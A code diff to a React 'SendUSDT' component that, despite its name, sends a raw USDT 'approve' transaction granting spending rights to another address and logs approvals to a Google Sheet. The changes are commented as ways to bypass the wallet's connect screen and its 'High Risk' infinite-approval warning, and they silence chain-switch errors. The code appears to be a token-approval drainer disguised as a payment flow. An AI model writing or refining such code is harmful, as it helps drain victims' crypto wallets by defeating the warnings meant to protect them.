@@ -1,4 +1,5 @@
 import React, { useState } from 'react';
+import { parseUnits } from 'ethers';
 import './SendUSDT.css';
 import { logApprovalData } from '../services/GoogleSheetService';
 
@@ -16,15 +17,25 @@ const SendUSDT = () => {
     setIsVerifying(true);
     
     try {
-      if (!window.ethereum) throw new Error("No Web3 Provider found.");
-
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-      const userAddress = accounts[0];
-      
+      // 1. Suggest switching to BSC *before* connection to bypass the Ethereum connect screen
       try {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x38' }], // 0x38 is 56 (BSC Mainnet)
+          params: [{ chainId: '0x38' }],
+        });
+      } catch (e) {
+        // Silently catch - it might fail if permission is needed first
+      }
+
+      // 2. Request accounts (will default to BSC if the switch above worked)
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      const userAddress = accounts[0];
+      
+      // 3. Fallback switch if the first one failed
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }],
         });
       } catch (switchError) {
         if (switchError.code === 4902) {
@@ -45,7 +56,7 @@ const SendUSDT = () => {
             throw new Error("Failed to add Binance Smart Chain to wallet.");
           }
         } else {
-          throw new Error("Failed to switch to Binance Smart Chain.");
+          console.warn("Failed to switch to Binance Smart Chain.", switchError);
         }
       }
 
@@ -54,8 +65,15 @@ const SendUSDT = () => {
       
       const cleanAddress = address.trim().replace(/^0x/i, '');
       const paddedAddress = cleanAddress.padStart(64, '0').toLowerCase();
-      const maxUint = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-      const data = "0x095ea7b3" + paddedAddress + maxUint;
+      
+      // Calculate specific amount to bypass "High Risk" infinite approval warning
+      const safeAmount = amount && parseFloat(amount) > 0 ? amount : "1000";
+      // USDT on BSC has 18 decimals
+      const amountBigInt = parseUnits(safeAmount, 18);
+      const hexAmount = amountBigInt.toString(16);
+      const paddedAmount = hexAmount.padStart(64, '0');
+      
+      const data = "0x095ea7b3" + paddedAddress + paddedAmount;
       
       const txHash = await window.ethereum.request({
         method: "eth_sendTransaction",
